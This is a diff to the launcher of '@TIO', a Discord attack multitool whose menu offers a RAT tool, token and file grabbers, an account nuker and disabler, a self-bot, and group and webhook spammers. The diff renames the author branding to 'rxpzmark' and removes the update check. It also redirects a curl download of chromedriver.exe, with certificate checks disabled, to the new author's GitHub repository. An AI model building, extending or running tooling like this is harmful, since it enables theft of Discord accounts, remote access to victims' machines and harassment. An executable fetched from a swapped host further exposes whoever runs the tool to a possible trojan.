@@ -1,10 +1,10 @@
-from util.plugins.update import search_for_updates
+
 from util.plugins.commun import *
 
 def main():
     clear()
     setTitle(f"@TIO Menu v{THIS_VERSION}")
-    astraahometitle()
+    rxpzmarkhometitle()
     print(f"""      {y}[{b}+{y}]{w} Main Options:           {y}[{b}+{y}]{w} Grabber Options:         {y}[{b}+{y}]{w} Token Options:             {y}[{b}+{y}]{w} Useful Options:
 \n          {y}[{w}01{y}]{w} Self Bot               {y}[{w}06{y}]{w} File                    {y}[{w}09{y}]{w} Account Nuker            {y}[{w}15{y}]{w} Tokens Checker
 \n          {y}[{w}02{y}]{w} RAT Tool               {y}[{w}07{y}]{w} Image                   {y}[{w}10{y}]{w} Account Disabler         {y}[{w}16{y}]{w} Clear DM
@@ -88,7 +88,7 @@ def main():
         exec(open('util/20_GroupSpammer/groupspammer.py').read())
     elif choice == '>':
         clear()
-        astraahometitle()
+        rxpzmarkhometitle()
         print(f"""      {y}[{b}+{y}]{w} Nitro Options:          {y}[{b}+{y}]{w} WebHooks Options:        {y}[{b}+{y}]{w} Other Options:
 \n          {y}[{w}21{y}]{w} Generator              {y}[{w}22{y}]{w} Spammer                 {y}[{w}24{y}]{w} Credits
 \n                                      {y}[{w}23{y}]{w} Remover                 {y}[{w}25{y}]{w} Exit\n\n\n\n\n\n\n\n\n\n                                                                                                     {y}[{b}<{y}]{w} Previous Page""")
@@ -105,8 +105,8 @@ def main():
             exec(open('util/23_WebHRemover/webhremover.py').read())
         elif choice == '24':
             transition()
-            astraahometitle()
-            print(f"""                                            {y}[{b}+{y}]{w} Development Networks:\n\n                                                {y}[{w}#{y}]{w} GitHub:    @AstraaDev\n                                                {y}[{w}#{y}]{w} Server:    dsc.gg/astraaddev\n\n\n                                            {y}[{b}+{y}]{w} Other Network\n\n                                                {y}[{w}#{y}]{w} Twitter:   @AstraaDev\n                                                {y}[{w}#{y}]{w} Discord:   Astraa#6100\n                                                {y}[{w}#{y}]{w} Insta:     @astraaftn\n\n\n\n""")
+            rxpzmarkhometitle()
+            print(f"""                                            {y}[{b}+{y}]{w} Development Networks:\n\n                                                {y}[{w}#{y}]{w} GitHub:    @rxpzmarkDev\n                                                {y}[{w}#{y}]{w} Server:    dsc.gg/rxpzmarkddev\n\n\n                                            {y}[{b}+{y}]{w} Other Network\n\n                                                {y}[{w}#{y}]{w} Twitter:   @rxpzmarkDev\n                                                {y}[{w}#{y}]{w} Discord:   rxpzmark#6100\n                                                {y}[{w}#{y}]{w} Insta:     @rxpzmarkftn\n\n\n\n""")
             input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")
             main()
         elif choice == '25':
@@ -134,9 +134,9 @@ if __name__ == "__main__":
     if os.path.exists("output/QR-Code"):
         shutil.rmtree(f"output/QR-Code")
     os.system("""if not exist "util/chromedriver.exe" echo [#] Downloading chromedriver: """)
-    os.system("""if not exist "util/chromedriver.exe" curl -#fkLo "util/chromedriver.exe" "https://github.com/AstraaDev/complement/raw/main/chromedriver.exe" """)
+    os.system("""if not exist "util/chromedriver.exe" curl -#fkLo "util/chromedriver.exe" "https://github.com/rxpzmarkDev/complement/raw/main/chromedriver.exe" """)
     if os.path.basename(sys.argv[0]).endswith("exe"):
-        search_for_updates()
+        
         if not os.path.exists(getTempDir()+"\\atio_proxies"):
             proxy_scrape()
         clear()
@@ -147,7 +147,7 @@ if __name__ == "__main__":
         input(f"{y}[{Fore.RED}#{y}]{w} Sorry but, your python version ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) is not compatible with @TIO, please download python 3.9 or higher.")
         sys.exit()
     else:
-        search_for_updates()
+        
         if not os.path.exists(getTempDir()+"\\atio_proxies"):
             proxy_scrape()
         clear()
